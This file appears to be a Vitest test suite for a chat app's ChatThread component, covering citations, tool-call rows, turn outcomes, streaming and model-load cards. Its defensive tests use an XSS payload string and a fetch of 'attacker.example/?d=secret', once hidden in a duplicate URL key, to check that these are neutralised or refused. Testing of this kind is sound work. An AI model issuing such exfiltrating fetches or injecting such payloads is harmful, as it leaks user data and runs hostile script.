/**
 * @vitest-environment happy-dom
 */

import { readFileSync } from 'node:fs';
import { join } from 'node:path';

import { act, createElement, type ReactElement } from 'react';
import { createRoot, type Root } from 'react-dom/client';
import { MemoryRouter } from 'react-router-dom';
import { afterEach, beforeAll, describe, expect, it, vi } from 'vite-plus/test';

import { parseUpdates } from '../src/agent-sessions/transcript.js';
import {
  ChatThread,
  ConversationNotices,
  MOUNTED_TURNS,
  type ChatThreadProps,
} from '../ui/src/components/chat-thread.js';
import { CHAT, fill } from '../ui/src/lib/chat-strings.js';
import {
  CITED_ANSWER,
  FETCH_USER_URL,
  FORGED_CITATION,
  OTHER_ROWS,
  RECORDED_DIRECT,
  RECORDED_USE_TOOL,
  RUST_POST,
  THREAD_SAMPLES,
  UNFINISHED,
  WEB_ERRORS,
  answer,
  directFetch,
  end,
  liveOutcomeSample,
  longThread,
  outcomeSample,
  streamingSample,
  user,
  type ThreadSample,
} from './helpers/chat-thread-fixtures.js';
import { allByRole, byRole, skipAnimations, waitFor } from './render.js';

let mounted: { root: Root; container: HTMLElement } | undefined;

const messageRenders = vi.hoisted(() => ({ n: 0 }));
vi.mock('../ui/src/components/arc-x/message/message.js', async (importOriginal) => {
  const real = await importOriginal<typeof import('../ui/src/components/arc-x/message/message.js')>();
  return {
    ...real,
    Message: (props: Parameters<typeof real.Message>[0]) => {
      messageRenders.n += 1;
      return real.Message(props);
    },
  };
});

beforeAll(() => {
  skipAnimations(true);
});

function threadOf(sample: ThreadSample, extra: Partial<ChatThreadProps> = {}): ReactElement {
  return createElement(
    MemoryRouter,
    null,
    createElement(ChatThread, {
      mode: sample.mode,
      entries: sample.entries,
      turns: sample.turns,
      turn: sample.turn,
      lastEnd: sample.lastEnd,
      ...extra,
    }),
  );
}

function mount(element: ReactElement): HTMLElement {
  globalThis.IS_REACT_ACT_ENVIRONMENT = true;
  const container = document.createElement('div');
  document.body.appendChild(container);
  const root = createRoot(container);
  act(() => root.render(element));
  mounted = { root, container };
  return container;
}

function rerender(element: ReactElement): void {
  act(() => mounted!.root.render(element));
}

afterEach(() => {
  if (mounted === undefined) return;
  const { root, container } = mounted;
  act(() => root.unmount());
  container.remove();
  mounted = undefined;
});

function anchors(container: HTMLElement): string[] {
  return [...container.querySelectorAll('a[href]')].map((a) => a.getAttribute('href') ?? '');
}

describe('ChatThread: sources and citations', () => {
  it('cited sources become chips, the written Sources block is replaced, a chip opens and focuses its source', async () => {
    const container = mount(threadOf(CITED_ANSWER));
    const one = byRole(container, 'button', 'Source 1: Rust 1.99 released, blog.rust-lang.org');
    expect(one).not.toBeNull();
    expect(byRole(container, 'button', 'Source 2: Rust releases, releases.rs')).not.toBeNull();
    expect(container.textContent).not.toContain('Sources:');
    expect(container.textContent).toContain('Sources');
    const more = byRole(container, 'button', 'Show all 2 sources');
    expect(more?.getAttribute('aria-expanded')).toBe('false');
    act(() => one!.click());
    await waitFor(() => more?.getAttribute('aria-expanded') === 'true');
    const focused = document.activeElement as HTMLAnchorElement | null;
    expect(focused?.getAttribute('href')).toBe(RUST_POST);
  });

  it('a forged citation stays text and a link to a host outside the conversation is not a link', () => {
    const container = mount(threadOf(FORGED_CITATION));
    expect(
      allByRole(container, 'button').filter((b) => (b.getAttribute('aria-label') ?? '').startsWith('Source ')),
    ).toHaveLength(1);
    expect(container.textContent).toContain('as the guide says [2]');
    expect(anchors(container).some((href) => href.includes('evil.example'))).toBe(false);
    expect(container.textContent).toContain('here (evil.example)');
  });

  it('a link to an address the user gave is active and opens outside', () => {
    const container = mount(threadOf(FETCH_USER_URL));
    const link = [...container.querySelectorAll('a')].find((a) => a.textContent === 'guide');
    expect(link?.getAttribute('href')).toBe('https://docs.example.org/guide');
    expect(link?.getAttribute('target')).toBe('_blank');
    expect(link?.getAttribute('rel')).toBe('noreferrer');
    expect(container.textContent).toContain('cut at 12,000 characters');
  });

  it('model HTML is text, never an element', () => {
    const sample: ThreadSample = {
      ...CITED_ANSWER,
      entries: [user('hi'), answer('<img src=x onerror=alert(1)> <script>alert(1)</script> [x](javascript:alert(1))')],
      turns: [],
    };
    const container = mount(threadOf(sample));
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('script')).toBeNull();
    expect(container.textContent).toContain('<img src=x onerror=alert(1)>');
    expect(anchors(container).some((href) => href.startsWith('javascript'))).toBe(false);
  });
});

describe('ChatThread: web call rows', () => {
  it('shape A: the refused search_tool row is hidden, the use_tool search reads as Searched', () => {
    const container = mount(threadOf(RECORDED_USE_TOOL));
    expect(container.textContent).not.toContain('search_tool');
    expect(container.textContent).not.toContain('use_tool');
    expect(container.textContent).toContain('Searched');
    expect(container.textContent).toContain('"Rust newest stable version release 2026"');
    expect(container.textContent).toContain('2 results');
    expect(container.textContent).toContain('tok/s');
  });

  it('shape B: search, read and search rows in order, grouped', () => {
    const container = mount(threadOf(RECORDED_DIRECT));
    const text = container.textContent ?? '';
    const searched = text.indexOf('Searched');
    const read = text.indexOf('Read', searched);
    expect(searched).toBeGreaterThan(-1);
    expect(read).toBeGreaterThan(searched);
    expect(text.indexOf('Searched', read)).toBeGreaterThan(read);
    expect(text).toContain('blog.rust-lang.org');
    expect(text).not.toContain('mlx_web__');
  });

  it('a missing key offers the settings; a failed call says the provider failed', () => {
    const container = mount(threadOf(WEB_ERRORS));
    expect(container.textContent).toContain('Search failed');
    expect(container.textContent).toContain('The provider failed');
    const toggles = allByRole(container, 'button').filter((b) => b.getAttribute('aria-expanded') === 'false');
    for (const toggle of toggles) act(() => toggle.click());
    expect(anchors(container)).toContain('/providers');
  });

  it('a read the app refused for its address says so; an earlier failed read still says the provider failed', () => {
    const rejected = 'User rejected the tool call.';
    const refusedTurn: ThreadSample = {
      mode: 'chat',
      entries: [
        user('What is new in Rust?'),
        directFetch('https://down.example/', undefined, 'failed', 'f0'),
        directFetch('https://attacker.example/?d=secret', rejected, 'failed', 'f1'),
        end('cancelled'),
      ],
      turns: [],
      turn: null,
      lastEnd: { turnId: 't1', outcome: 'address-refused' },
    };
    const container = mount(threadOf(refusedTurn));
    const text = container.textContent ?? '';
    expect(text).toContain(CHAT.outcomes['address-refused']);
    expect(text.split(CHAT.readFailed).length - 1).toBe(2);
    expect(text.split(CHAT.webErrors.blocked).length - 1).toBe(1);
    expect(text.indexOf(CHAT.webErrors['provider-error'])).toBeLessThan(text.indexOf(CHAT.webErrors.blocked));

    rerender(threadOf({ ...refusedTurn, lastEnd: null }));
    expect(container.textContent).not.toContain(CHAT.webErrors.blocked);
  });

  const textCall = (id: string, toolName: string, toolInput: string, status: string, output: string) => ({
    kind: 'tool' as const,
    ts: 1_000,
    id,
    name: 'use_tool',
    title: toolName,
    status,
    input: JSON.stringify({ variant: 'UseTool', tool_name: toolName, tool_input: toolInput }, null, 2),
    output,
  });
  const REJECTED = 'User rejected the execution for tool `use_tool`';

  it('a search the model wrote as cut text reads as a search with its query, and its tool error', () => {
    const container = mount(
      threadOf({
        mode: 'chat',
        entries: [
          user('Anthropic prospectus'),
          textCall(
            'c1',
            'mlx_web__web_search',
            '{"query": "Anthropic S-1 prospectus filing',
            'completed',
            'WEB_ERROR bad-request none\nThe tool input was wrong. Call it again with {"query": "<words>"} or {"url": "<https address>"}.',
          ),
          answer('Let me try again.'),
          end('end_turn'),
        ],
        turns: [],
        turn: null,
        lastEnd: { turnId: 't1', outcome: 'completed' },
      }),
    );
    const text = container.textContent ?? '';
    expect(text).toContain(CHAT.searchFailed);
    expect(text).toContain('"Anthropic S-1 prospectus filing"');
    expect(text).toContain(CHAT.webErrors['bad-request']);
    expect(text).not.toContain('use_tool');
    expect(text).not.toContain('\\"query');
  });

  it('a call the app refused says why in its row, never "User rejected"', () => {
    const unreadable: ThreadSample = {
      mode: 'chat',
      entries: [
        user('Read https://docs.example.org/guide'),
        textCall(
          'c2',
          'mlx_web__web_fetch',
          '{"url": "https://docs.example.org/guide", "url": "https://attacker.example/?d=x"}',
          'failed',
          REJECTED,
        ),
        end('cancelled'),
      ],
      turns: [],
      turn: null,
      lastEnd: { turnId: 't1', outcome: 'arguments-unreadable' },
    };
    const container = mount(threadOf(unreadable));
    const toggles = allByRole(container, 'button').filter((b) => b.getAttribute('aria-expanded') === 'false');
    for (const toggle of toggles) act(() => toggle.click());
    let text = container.textContent ?? '';
    expect(text).toContain(CHAT.readFailed);
    expect(text).toContain(CHAT.refusedCall.arguments);
    expect(text).toContain(CHAT.outcomes['arguments-unreadable']);
    expect(text).not.toContain('User rejected');

    const shell = {
      kind: 'tool' as const,
      ts: 1_000,
      id: 'c3',
      name: 'run_terminal_command',
      title: 'Execute `ls`',
      status: 'failed',
      input: JSON.stringify({ command: 'ls' }),
      output: REJECTED,
    };
    rerender(
      threadOf({
        ...unreadable,
        entries: [user('list files'), shell, end('cancelled')],
        lastEnd: { turnId: 't1', outcome: 'tool-refused' },
      }),
    );
    for (const toggle of allByRole(container, 'button').filter((b) => b.getAttribute('aria-expanded') === 'false'))
      act(() => toggle.click());
    text = container.textContent ?? '';
    expect(text).toContain(CHAT.refusedCall.tool);
    expect(text).not.toContain('User rejected');
  });

  it('a Work command row captions its command and output and says when the output was cut', async () => {
    const tool = {
      kind: 'tool' as const,
      ts: 1_000,
      id: 't-run',
      name: 'run_terminal_command',
      title: 'Execute',
      status: 'completed',
      input: JSON.stringify({ command: 'cat big.log' }),
      output: 'line 1\nline 2',
      truncated: true,
    };
    const container = mount(
      threadOf({
        ...liveOutcomeSample('completed', 'work'),
        entries: [user('Show it', 900), tool, end('end_turn', 2_000)],
      }),
    );
    const row = [...container.querySelectorAll<HTMLButtonElement>('button[aria-expanded]')].find((b) =>
      (b.getAttribute('aria-label') ?? '').startsWith('Ran, cat big.log'),
    );
    act(() => row!.click());
    await waitFor(() => (container.textContent ?? '').includes('Long fields are truncated for display.'));
    const captions = [...container.querySelectorAll('figure')].map((f) => f.previousElementSibling?.textContent);
    expect(captions).toEqual([CHAT.command, CHAT.output]);
  });

  it('Work command rows from the agent: no output says so, and an exit code, stop or timeout is on the row', async () => {
    const lines = readFileSync(join(import.meta.dirname, 'fixtures/agent-updates/bash-rows.jsonl'), 'utf8');
    const tools = parseUpdates(lines).transcript;
    const container = mount(
      threadOf({
        ...liveOutcomeSample('completed', 'work'),
        entries: [user('Run them', 1_794_449_060_000), ...tools, end('end_turn', 1_794_449_070_000)],
      }),
    );
    const rows = [...container.querySelectorAll<HTMLButtonElement>('button[aria-expanded]')];
    const label = (command: string): string =>
      rows.map((b) => b.getAttribute('aria-label') ?? '').find((l) => l.startsWith(`Ran, ${command},`)) ?? '';
    expect(label('ls missing')).toContain(fill(CHAT.exitCode, { code: 2 }));
    expect(label('sleep 999')).toContain(CHAT.exitTimedOut);
    for (const command of ['ls', 'true']) {
      expect(label(command)).not.toContain(fill(CHAT.exitCode, { code: 0 }));
      expect(label(command)).not.toContain(CHAT.exitTimedOut);
    }
    const empty = rows.find((b) => (b.getAttribute('aria-label') ?? '').startsWith('Ran, true,'))!;
    act(() => empty.click());
    await waitFor(() => (container.textContent ?? '').includes(CHAT.noOutput));
    expect(container.textContent).not.toContain('current_dir');
    expect(container.textContent?.split(CHAT.noOutput).length).toBe(2);
  });

  it('a stop the agent named reads as such on the row', () => {
    const tool = {
      kind: 'tool' as const,
      ts: 1_000,
      id: 't-oom',
      name: 'run_terminal_command',
      title: 'Execute',
      status: 'failed',
      input: JSON.stringify({ command: 'make' }),
      output: 'building',
      signal: 'oom',
    };
    const container = mount(
      threadOf({
        ...liveOutcomeSample('completed', 'work'),
        entries: [user('Build', 900), tool, end('end_turn', 2_000)],
      }),
    );
    const labels = [...container.querySelectorAll('button[aria-expanded]')].map((b) => b.getAttribute('aria-label'));
    expect(labels.find((l) => l?.startsWith('Command failed, make,'))).toContain(
      fill(CHAT.exitSignal, { signal: 'oom' }),
    );
  });

  it('the plan request row reads Plan review', () => {
    const tool = {
      kind: 'tool' as const,
      ts: 1_000,
      id: 't-plan',
      name: 'exit_plan_mode',
      title: 'exit_plan_mode',
      status: 'completed',
    };
    const container = mount(
      threadOf({
        ...liveOutcomeSample('completed', 'work'),
        entries: [user('Plan it', 900), tool, end('end_turn', 2_000)],
      }),
    );
    expect(container.textContent).toContain(CHAT.planReview);
    expect(container.textContent).not.toContain('exit_plan_mode');
  });

  it('Work rows: model switch, plan, a file read, subagent, wake and an unknown kind as a plain row', () => {
    const container = mount(threadOf(OTHER_ROWS));
    const text = container.textContent ?? '';
    expect(text).toContain('Model switched to qwen3.5-9b');
    expect(text).toContain('Patch the file');
    expect(text).toContain('Readsrc/main.rs');
    expect(text).not.toContain('read_file');
    expect(text).toContain('Look for callers');
    expect(text).toContain('No prompt typed');
    expect(text).toContain('hologram');
    expect(text).toContain('Fixed.');
  });
});

describe('ChatThread: outcomes and actions', () => {
  it.each([
    ['cancelled', CHAT.outcomes['stopped-stored']],
    ['max_tokens', 'The answer hit the length limit.'],
  ])('stored end %s reads %s', (stopReason, sentence) => {
    const container = mount(threadOf(outcomeSample(stopReason)));
    expect(container.textContent).toContain(sentence);
  });

  it('an ended turn with an error shows the error as its detail', () => {
    const container = mount(threadOf(outcomeSample('refusal', 'model call failed: 500')));
    expect(container.textContent).toContain('Ended: refusal');
    expect(container.textContent).toContain('model call failed: 500');
  });

  it('a live outcome wins over the stored end', () => {
    const container = mount(threadOf(liveOutcomeSample('tool-refused')));
    expect(container.textContent).toContain('Stopped: the model asked for a tool that Chat does not have.');
  });

  it('an unfinished last turn offers Send again with its prompt; disabled with a reason', () => {
    const onTurnAction = vi.fn();
    const container = mount(threadOf(UNFINISHED, { onTurnAction }));
    expect(container.textContent).toContain('This answer did not finish.');
    act(() => byRole(container, 'button', 'Send again')!.click());
    expect(onTurnAction).toHaveBeenCalledWith({ kind: 'send-again', text: 'Write a poem' });
    rerender(threadOf(UNFINISHED, { onTurnAction, actionDisabledReason: 'The engine is stopped.' }));
    expect((byRole(container, 'button', 'Send again') as HTMLButtonElement).disabled).toBe(true);
  });

  it('a model switch after an unfinished turn is drawn below its footer', () => {
    const sample: ThreadSample = {
      ...UNFINISHED,
      entries: [...UNFINISHED.entries, { kind: 'model', ts: 1_794_411_002_000, modelId: 'qwen3.5-9b' }],
    };
    const container = mount(threadOf(sample));
    const text = container.textContent ?? '';
    const footer = text.indexOf('This answer did not finish.');
    const rule = text.indexOf('Model switched to qwen3.5-9b');
    expect(footer).toBeGreaterThan(-1);
    expect(rule).toBeGreaterThan(footer);
  });

  it('a denied turn stays denied once the next turn of the open conversation has ended', () => {
    const first = [user('Run it', 1_000), end('cancelled', 2_000)];
    const container = mount(threadOf({ ...liveOutcomeSample('denied', 'work'), entries: first }));
    expect(container.textContent).toContain(CHAT.outcomes.denied);
    const both = [...first, user('Read it', 3_000), answer('Done', 3_500), end('end_turn', 4_000)];
    rerender(threadOf({ ...liveOutcomeSample('completed', 'work'), entries: both }));
    expect(container.textContent).toContain(CHAT.outcomes.denied);
    expect(container.textContent).not.toContain(CHAT.outcomes.cancelled);
  });

  it('an outcome seen in one conversation never shows on a turn of another', () => {
    const first = [user('Run it', 1_000), end('cancelled', 2_000)];
    const container = mount(
      threadOf({ ...liveOutcomeSample('denied', 'work'), entries: first }, { conversationId: 'a' }),
    );
    expect(container.textContent).toContain(CHAT.outcomes.denied);
    const other = [user('Stop it', 1_000), end('cancelled', 2_000), user('Again', 3_000), answer('Done', 3_500)];
    rerender(
      threadOf(
        { ...liveOutcomeSample('completed', 'work'), entries: [...other, end('end_turn', 4_000)] },
        { conversationId: 'b' },
      ),
    );
    expect(container.textContent).toContain(CHAT.outcomes['stopped-stored']);
    expect(container.textContent).not.toContain(CHAT.outcomes.denied);
  });

  it('the length limit offers Continue', () => {
    const onTurnAction = vi.fn();
    const container = mount(threadOf(liveOutcomeSample('output-limit'), { onTurnAction }));
    act(() => byRole(container, 'button', 'Continue')!.click());
    expect(onTurnAction).toHaveBeenCalledWith({ kind: 'continue', text: 'continue' });
  });

  it('every sample renders', () => {
    for (const [name, sample] of Object.entries(THREAD_SAMPLES)) {
      const container = mount(threadOf(sample));
      expect(container.textContent, name).not.toBe('');
      act(() => mounted!.root.unmount());
      container.remove();
      mounted = undefined;
    }
  });
});

describe('ChatThread: streaming and live region', () => {
  it('a streaming answer is busy and has no footer; the end announces once', () => {
    const onStatus = vi.fn();
    const running = streamingSample('Borrowing lets **you');
    const container = mount(threadOf({ ...running, entries: running.entries.slice(0, 2) }, { onStatus }));
    expect(onStatus).not.toHaveBeenCalled();
    rerender(threadOf(running, { onStatus }));
    expect(container.querySelector('article[aria-busy="true"]')).not.toBeNull();
    expect(container.querySelector('strong')?.textContent).toBe('you');
    expect(byRole(container, 'button', 'Copy answer')).toBeNull();
    expect(onStatus).toHaveBeenCalledWith('Answer started.');
    rerender(
      threadOf(
        { ...running, entries: [...running.entries.slice(0, 2), answer('Borrowing lets **you** use')] },
        { onStatus },
      ),
    );
    expect(onStatus).toHaveBeenCalledTimes(1);
    const ended: ThreadSample = {
      ...running,
      entries: [
        ...running.entries.slice(0, 2),
        answer('Borrowing lets **you** use it.'),
        { kind: 'turn-end', ts: 9, stopReason: 'end_turn' },
      ],
      turn: null,
      lastEnd: { outcome: 'completed' },
    };
    rerender(threadOf(ended, { onStatus }));
    expect(onStatus).toHaveBeenLastCalledWith('Answer finished.');
    expect(container.querySelector('article[aria-busy="true"]')).toBeNull();
  });

  it('a stream event re-renders only the streaming turn, in Chat as in Work', () => {
    for (const mode of ['chat', 'work'] as const) {
      const base = longThread(5);
      const stream = (text: string): ThreadSample => ({
        ...base,
        mode,
        entries: [...base.entries, user('Next'), answer(text)],
        turn: { turnId: 't', phase: 'running', startedAt: 0, wait: null },
      });
      mount(threadOf(stream('a')));
      messageRenders.n = 0;
      for (let i = 2; i < 12; i += 1) rerender(threadOf(stream('a'.repeat(i))));
      expect(messageRenders.n, mode).toBeLessThanOrEqual(20);
      act(() => mounted!.root.unmount());
      mounted!.container.remove();
      mounted = undefined;
    }
  });

  it('a finished thinking block reads Thought; a message sent live rises in, history does not', () => {
    const running = streamingSample('Borrowing lets you');
    const container = mount(threadOf({ ...running, entries: running.entries.slice(0, 2) }));
    expect(container.textContent).toContain('Thinking');
    expect(container.querySelector('[data-enter][data-role="user"]')).toBeNull();
    rerender(
      threadOf({
        ...running,
        entries: [...running.entries, end(), user('And moving?')],
        turn: null,
        lastEnd: { outcome: 'completed' },
      }),
    );
    expect(container.textContent).toContain('Thought');
    const users = [...container.querySelectorAll('article[data-role="user"]')];
    expect(users.map((node) => node.hasAttribute('data-enter'))).toEqual([false, true]);
  });

  it('a pending row stands in until the turn has work, also before the prompt entry arrives', () => {
    const base = outcomeSample('end_turn');
    const container = mount(threadOf({ ...base, turn: { turnId: 't2', phase: 'running', startedAt: 0, wait: null } }));
    expect(container.textContent).toContain('Thinking…');
    expect(container.textContent).toContain('Roses are red');
    rerender(threadOf({ ...base, turn: null }, { creating: true }));
    expect(container.textContent).toContain('Starting…');
    rerender(threadOf(streamingSample('Hello')));
    expect(container.textContent).not.toContain('Thinking…');
  });
});

describe('ChatThread: a message that waits for its model', () => {
  const LONG = 'qwen3.6-35b-a3b-agentworld-instruct-ud-q4-k-xl-mlx-dwq-8bits';
  const waiting = (startedAt: number): ThreadSample => ({
    mode: 'chat',
    entries: [user('Hello', 1_000)],
    turns: [],
    turn: { turnId: 't', phase: 'starting', startedAt, wait: 'model' },
    lastEnd: null,
  });
  const NOW = 1_794_411_000_000;
  const cardOf = (container: HTMLElement): HTMLElement => container.querySelector<HTMLElement>('[data-load-card]')!;

  it('the load card names the whole model, its size and the time since the load started; no bar, no percent', () => {
    vi.useFakeTimers({ now: NOW, toFake: ['Date', 'setInterval', 'clearInterval'] });
    try {
      const container = mount(
        threadOf(waiting(NOW - 9_000), {
          model: LONG,
          host: {
            inference: 'loading',
            loading: { modelId: LONG, startedAt: NOW - 134_000 },
            resident: [],
            answers: [],
          },
          modelSize: (id) => (id === LONG ? 64.6 * 1024 ** 3 : null),
        }),
      );
      const card = cardOf(container);
      expect(card.getAttribute('data-variant')).toBe('loading');
      expect(card.textContent).toContain(CHAT.load.title);
      expect(card.textContent).toContain(CHAT.load.wait);
      expect(card.textContent).toContain(CHAT.load.stopNote);
      expect(card.textContent).toContain(fill(CHAT.load.size, { size: '64.6 GB' }));
      expect(card.textContent).toContain('2:14');
      expect(card.textContent).toContain(LONG);
      const name = card.querySelector(`[title="${LONG}"]`);
      expect([...name!.querySelectorAll('[aria-hidden="true"]')].map((n) => n.textContent).join('')).toBe(LONG);
      expect(container.querySelector('[role="progressbar"]')).toBeNull();
      expect(card.textContent).not.toContain('%');
      act(() => {
        vi.advanceTimersByTime(2_000);
      });
      expect(cardOf(container).textContent).toContain('2:16');
    } finally {
      vi.useRealTimers();
    }
  });

  it('three variants: this model loads, another loads first, or the engine is busy', () => {
    vi.useFakeTimers({ now: NOW, toFake: ['Date', 'setInterval', 'clearInterval'] });
    try {
      const host = (loading: { modelId: string; startedAt: number } | null) => ({
        inference: loading === null ? ('ready' as const) : ('loading' as const),
        loading,
        resident: [],
        answers: [],
      });
      const container = mount(threadOf(waiting(NOW - 61_000), { model: 'qwen-a', host: host(null) }));
      expect(cardOf(container).getAttribute('data-variant')).toBe('busy');
      expect(container.textContent).toContain(CHAT.load.titleQueued);
      expect(container.textContent).toContain(CHAT.load.busyFirst);
      expect(container.textContent).toContain('1:01');
      expect(container.textContent).not.toContain(CHAT.load.size.slice(-7));
      rerender(threadOf(waiting(NOW - 61_000), { model: 'qwen-a', host: host({ modelId: 'qwen-b', startedAt: NOW }) }));
      expect(cardOf(container).getAttribute('data-variant')).toBe('other-first');
      expect(container.textContent).toContain(fill(CHAT.load.otherFirst, { other: 'qwen-b' }));
      expect(container.textContent).toContain('1:01');
      rerender(
        threadOf(waiting(NOW - 61_000), { model: 'qwen-a', host: host({ modelId: 'qwen-a', startedAt: NOW - 5_000 }) }),
      );
      expect(cardOf(container).getAttribute('data-variant')).toBe('loading');
      expect(container.textContent).toContain('0:05');
    } finally {
      vi.useRealTimers();
    }
  });

  it('a model in memory: the card waits for the engine and never says the model loads', () => {
    const onStatus = vi.fn();
    const host = {
      inference: 'ready' as const,
      loading: null,
      resident: [{ modelId: 'qwen-a', sizeBytes: null }],
      answers: [],
    };
    const container = mount(threadOf(waiting(Date.now()), { model: 'qwen-a', host, onStatus }));
    const card = cardOf(container);
    expect(card.getAttribute('data-variant')).toBe('in-memory');
    expect(card.textContent).toContain(CHAT.load.titleQueued);
    expect(card.textContent).toContain(CHAT.load.inMemory);
    expect(card.textContent).not.toContain(CHAT.load.busyFirst);
    expect(card.textContent?.toLowerCase()).not.toContain('load');
    expect(onStatus).toHaveBeenCalledWith(CHAT.load.inMemory);
    expect(onStatus).not.toHaveBeenCalledWith(fill(CHAT.load.status, { model: 'qwen-a' }));
  });

  it('a running turn with no output says it waits while the model runs its limit of answers', () => {
    const running: ThreadSample = {
      ...waiting(Date.now()),
      turn: { turnId: 't', phase: 'running', startedAt: 500, wait: null },
    };
    const host = (inFlight: number, maxConcurrent: number, queued: number, lastStart = 400) => ({
      inference: 'ready' as const,
      loading: null,
      resident: [{ modelId: 'qwen-a', sizeBytes: null }],
      answers: [{ modelId: 'qwen-a', inFlight, maxConcurrent, queued, lastStart }],
    });
    const queuedLine = fill(CHAT.pendingQueuedOne, { model: 'qwen-a' });
    const container = mount(threadOf(running, { model: 'qwen-a', host: host(1, 1, 1) }));
    expect(container.textContent).toContain(queuedLine);
    expect(container.querySelector('[data-load-card]')).toBeNull();
    rerender(threadOf(running, { model: 'qwen-a', host: host(2, 4, 0) }));
    expect(container.textContent).not.toContain(queuedLine);
    expect(container.textContent).toContain(CHAT.pendingThinking);
    rerender(threadOf(running, { model: 'qwen-a', host: host(1, 1, 1, 600) }));
    expect(container.textContent).not.toContain(queuedLine);
    expect(container.textContent).toContain(CHAT.pendingThinking);
    rerender(threadOf(running, { model: 'qwen-a', host: host(1, 1, 1) }));
    expect(container.textContent).toContain(queuedLine);
    const output: ThreadSample = { ...running, entries: [user('Hello', 1_000), answer('Hi', 2_000)] };
    rerender(threadOf(output, { model: 'qwen-a', host: host(1, 1, 1) }));
    expect(container.textContent).not.toContain(queuedLine);
    expect(container.textContent).toContain('Hi');
  });

  it('the load is announced once, and a resident model shows no card', () => {
    const onStatus = vi.fn();
    const host = { inference: 'ready' as const, loading: null, resident: [], answers: [] };
    const container = mount(threadOf(waiting(Date.now()), { model: 'qwen-a', host, onStatus }));
    rerender(threadOf(waiting(Date.now()), { model: 'qwen-a', host, onStatus }));
    expect(onStatus.mock.calls.filter(([text]) => text === fill(CHAT.load.status, { model: 'qwen-a' }))).toHaveLength(
      1,
    );
    const running = {
      ...waiting(Date.now()),
      turn: { turnId: 't', phase: 'running' as const, startedAt: 0, wait: null },
    };
    rerender(threadOf(running, { model: 'qwen-a', host }));
    expect(container.querySelector('[data-load-card]')).toBeNull();
    expect(container.textContent).toContain(CHAT.pendingThinking);
  });

  it('the engine note under an unsent stop follows the engine: still loading, then in memory, then none', () => {
    const sample: ThreadSample = {
      mode: 'chat',
      entries: [user('Hello', 1_000)],
      turns: [],
      turn: null,
      lastEnd: { turnId: 't', outcome: 'cancelled', unsent: true },
    };
    const container = mount(
      threadOf(sample, {
        model: 'qwen-a',
        host: { inference: 'loading', loading: { modelId: 'qwen-a', startedAt: 0 }, resident: [], answers: [] },
      }),
    );
    expect(container.textContent).toContain(CHAT.outcomes['cancelled-unsent']);
    expect(container.textContent).toContain(fill(CHAT.engine.stillLoading, { model: 'qwen-a' }));
    expect(anchors(container)).toContain('/engine');
    const open = container.querySelector('a[href="/engine"]')!;
    expect(open.className).toBe('link');
    expect(open.closest('p')?.textContent).toContain(CHAT.engine.stillLoading.slice(0, 20));
    rerender(
      threadOf(sample, {
        model: 'qwen-a',
        host: {
          inference: 'ready',
          loading: null,
          resident: [{ modelId: 'qwen-a', sizeBytes: 2 * 1024 ** 3 }],
          answers: [],
        },
      }),
    );
    expect(container.textContent).not.toContain(fill(CHAT.engine.stillLoading, { model: 'qwen-a' }));
    expect(container.textContent).toContain(fill(CHAT.engine.resident, { model: 'qwen-a', size: '2.0 GB' }));
    expect(anchors(container)).not.toContain('/engine');
    rerender(
      threadOf(sample, { model: 'qwen-a', host: { inference: 'ready', loading: null, resident: [], answers: [] } }),
    );
    expect(container.textContent).not.toContain('is in memory');
    expect(container.textContent).toContain(CHAT.outcomes['cancelled-unsent']);
  });

  it('the in-memory note carries Unload, which follows its control: working takes no press, off is disabled', () => {
    const sample: ThreadSample = {
      mode: 'chat',
      entries: [user('Hello', 1_000)],
      turns: [],
      turn: null,
      lastEnd: { turnId: 't', outcome: 'cancelled', unsent: true },
    };
    const host = {
      inference: 'ready' as const,
      loading: null,
      resident: [{ modelId: 'qwen-a', sizeBytes: null }],
      answers: [],
    };
    const onUnload = vi.fn();
    const unloadButton = (): HTMLButtonElement | undefined =>
      [...container.querySelectorAll('button')].find((b) => b.closest('p')?.textContent?.includes('is in memory'));
    const named = (name: string): boolean => {
      const copy = unloadButton()?.cloneNode(true) as HTMLElement | undefined;
      for (const hidden of copy?.querySelectorAll('[aria-hidden="true"]') ?? []) hidden.remove();
      return copy?.textContent === name;
    };
    const container = mount(threadOf(sample, { model: 'qwen-a', host }));
    expect(container.textContent).toContain(fill(CHAT.engine.residentNoSize, { model: 'qwen-a' }));
    expect(unloadButton()).toBeUndefined();
    rerender(threadOf(sample, { model: 'qwen-a', host, unload: { state: 'idle', onUnload } }));
    expect(named(CHAT.engine.unload)).toBe(true);
    act(() => unloadButton()!.click());
    expect(onUnload).toHaveBeenCalledTimes(1);
    rerender(threadOf(sample, { model: 'qwen-a', host, unload: { state: 'working', onUnload } }));
    expect(named(CHAT.engine.unloading)).toBe(true);
    act(() => unloadButton()!.click());
    expect(onUnload).toHaveBeenCalledTimes(1);
    rerender(threadOf(sample, { model: 'qwen-a', host, unload: { state: 'off', onUnload } }));
    expect(unloadButton()?.disabled).toBe(true);
  });
});

describe('ChatThread: long threads', () => {
  it(`mounts the newest ${MOUNTED_TURNS} turns and shows the earlier ones on request`, () => {
    const container = mount(threadOf(longThread(MOUNTED_TURNS + 5)));
    expect(container.querySelectorAll('[data-turn]')).toHaveLength(MOUNTED_TURNS);
    expect(container.textContent).not.toContain('Question 4 ');
    act(() => byRole(container, 'button', 'Show 5 earlier turns')!.click());
    expect(container.querySelectorAll('[data-turn]')).toHaveLength(MOUNTED_TURNS + 5);
    expect(container.textContent).toContain('Question 0');
  });
});

describe('ConversationNotices', () => {
  it('one alert per provider with a link to the settings', () => {
    const container = mount(
      createElement(
        MemoryRouter,
        null,
        createElement(ConversationNotices, {
          notices: [
            { code: 'key-printed', provider: 'exa' },
            { code: 'key-printed', provider: 'exa' },
          ] as never,
        }),
      ),
    );
    expect(container.querySelectorAll('[role="alert"]')).toHaveLength(1);
    expect(anchors(container)).toContain('/providers');
  });
});
